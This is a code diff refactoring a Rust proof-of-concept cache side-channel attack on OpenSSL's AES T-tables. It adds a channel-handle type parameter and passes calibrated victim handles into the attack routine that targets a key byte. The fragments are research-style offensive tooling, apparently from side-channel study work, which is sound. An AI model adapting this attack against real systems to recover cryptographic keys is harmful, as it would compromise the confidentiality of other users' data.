@@ -6,7 +6,7 @@ use openssl::aes;
 
 use crate::CacheStatus::Miss;
 use cache_side_channel::table_side_channel::TableCacheSideChannel;
-use cache_side_channel::{restore_affinity, set_affinity, CacheStatus};
+use cache_side_channel::{restore_affinity, set_affinity, CacheStatus, ChannelHandle};
 use memmap2::Mmap;
 use openssl::aes::aes_ige;
 use openssl::symm::Mode;
@@ -54,8 +54,8 @@ const KEY_BYTE_TO_ATTACK: usize = 0;
 /// # Safety
 ///
 /// te need to refer to the correct t tables offset in the openssl library at path.
-pub unsafe fn attack_t_tables_poc(
-    side_channel: &mut impl TableCacheSideChannel,
+pub unsafe fn attack_t_tables_poc<T: ChannelHandle>(
+    side_channel: &mut impl TableCacheSideChannel<T>,
     parameters: AESTTableParams,
     name: &str,
 ) {
@@ -88,7 +88,7 @@ pub unsafe fn attack_t_tables_poc(
 
     addresses.shuffle(&mut thread_rng());
 
-    unsafe { side_channel.calibrate(addresses.clone()).unwrap() };
+    let mut victims_handle = unsafe { side_channel.calibrate(addresses.clone()).unwrap() };
 
     for addr in addresses.iter() {
         let mut timing = HashMap::new();
@@ -97,6 +97,8 @@ pub unsafe fn attack_t_tables_poc(
         }
         timings.insert(*addr, timing);
     }
+
+    let mut victim_handles_ref = victims_handle.iter_mut().collect();
 
     for b in (u8::min_value()..=u8::max_value()).step_by(16) {
         eprintln!("Probing with b = {:x}", b);
@@ -113,8 +115,9 @@ pub unsafe fn attack_t_tables_poc(
             aes_ige(&plaintext, &mut result, &key_struct, &mut iv, Mode::Encrypt);
         };
 
-        let r =
-            unsafe { side_channel.attack(addresses.iter(), &victim, parameters.num_encryptions) };
+        let r = unsafe {
+            side_channel.attack(&mut victim_handles_ref, &victim, parameters.num_encryptions)
+        };
         match r {
             Ok(v) => {
                 for table_attack_result in v {
